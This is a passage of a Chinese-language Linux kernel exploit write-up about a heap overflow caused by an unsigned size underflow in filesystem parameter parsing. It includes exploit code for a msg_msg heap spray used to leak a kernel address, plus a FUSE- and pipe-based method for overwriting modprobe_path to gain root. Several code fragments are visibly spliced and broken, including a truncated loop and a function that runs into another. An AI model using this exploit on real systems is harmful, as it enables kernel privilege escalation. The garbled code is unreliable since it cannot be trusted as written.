            size += param->size;
        }
        ctx->legacy_data[size] = '\0';
        ctx->data_size = size;
        ctx->param_type = LEGACY_FS_INDIVIDUAL_PARAMS;
        return 0;
    }
漏洞点就是size是无符号数,当size>PAGE_SIZE - 2时会导致 "PAGE_SIZE - 2 -size"变成一个很大的数(当初我这理解了好久...太笨了)  
绕过这个判断之后,就会导致后面的memcpy函数越界写.而且会越界写到未申请的堆块上.  
可以看到成功越界写  
执行memcpy之前  
执行memcpy之后  
### leak:
leak用到了[msg_msg](https://www.anquanke.com/post/id/252558)结构.msg_msg结构网上其他师傅的分析写的很详细了,我这就不再赘述了.主要讲讲这里怎么leak:
    uint64_t do_leak () 
    {
        uint64_t kbase = 0;
        char pat[0x1000] = {0};
        char buffer[0x2000] = {0}, recieved[0x2000] = {0};
        int targets[0x10] = {0};
        msg *message = (msg *)buffer;
        int size = 0x1018;
        // spray msg_msg
        for (int i = 0; i mtype = 1;
        size = 0x1010;
        int target = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        send_msg(target, message, size - 0x30, 0);
        puts("[*] Opening ext4 filesystem");
        fd = fsopen("ext4", 0);
        if (fd = len)
            return size;
        if (offset + size > len)
            size = len - offset;
        memcpy(buf, evil_buffer + offset, size);
        // sync with the arb write thread
        read(fuse_pipes[0], &signal, 1);
        return size;
    }
1.首先是fsopen系统调用.  
2.然后是打开FUSE文件系统.并创建一个管道(pipe,主要是为了接下来的写)  
3.申请两个相邻的页,其中打开的FUSE文件系统映射到第二个页  
4.创建一个线程,这个线程里包含漏洞触发函数  
5.尝试对FUSE文件系统进行读写,这时候会调用我们自定义的read函数.  
6.自定义的read函数里尝试对管道进行写.  
7.线程里触发漏洞函数,讲msg_msg结构的next指针覆盖成modprobe_path,并尝试对管道进行读.管道读的内容就被写进了modprobe_path里.  
8.利用成功.